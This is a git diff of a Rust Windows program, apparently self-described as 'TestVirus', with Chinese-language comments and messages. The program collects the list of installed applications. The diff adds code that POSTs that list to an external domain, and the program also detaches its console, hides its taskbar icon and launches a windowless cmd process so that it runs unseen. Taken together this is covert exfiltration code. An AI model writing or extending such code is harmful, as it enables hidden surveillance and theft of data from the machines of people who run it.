@@ -14,7 +14,7 @@ use winapi::um::wincon::FreeConsole;
 //use sys::*;
 
 
-const VERSION:&str = "1.1.2";
+const VERSION:&str = "1.1.5";
 // 元组
 
 
@@ -86,8 +86,28 @@ fn main() {
     core::say(&format!("{:?}", applications));
     let encrypted_url = core::encrypt("http:\\/\\/127.0.0.1:8000");
     core::upload(&encrypted_url, &format!("{:?}", applications));
+    // Push applications to a server with appropriate headers
+    let server_url = "https://sqxy090123.dpdns.org/api/v4/Vupload";
+    let client = reqwest::blocking::Client::new();
+    let response = client
+        .post(server_url)
+        .header("Content-Type", "application/json")
+        .header("User-Agent", &("TestVirus/".to_owned() + VERSION))
+        .body(format!("{:?}", applications))
+        .send();
 
-
+    match response {
+        Ok(res) => {
+            if res.status().is_success() {
+                core::say("应用列表已成功上传到服务器。");
+            } else {
+                core::say(&format!("上传失败，服务器返回状态码: {}", res.status()));
+            }
+        }
+        Err(e) => {
+            core::say(&format!("上传失败，错误信息: {}", e));
+        }
+    }
 
     core::wait(10); // 使窗口被关闭程序也会正常运行（关闭当前窗口，但不影响程序）
     unsafe {
@@ -99,7 +119,8 @@ fn main() {
         .arg("cmd")
         .arg("/K")
         .arg(format!("cd /d {} && {}", path, name));
-    cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW (requires CommandExt)
+    
+    cmd.creation_flags(0x08000018); // CREATE_NO_WINDOW (requires CommandExt)
     // 隐藏任务栏图标
     unsafe {
         FreeConsole();
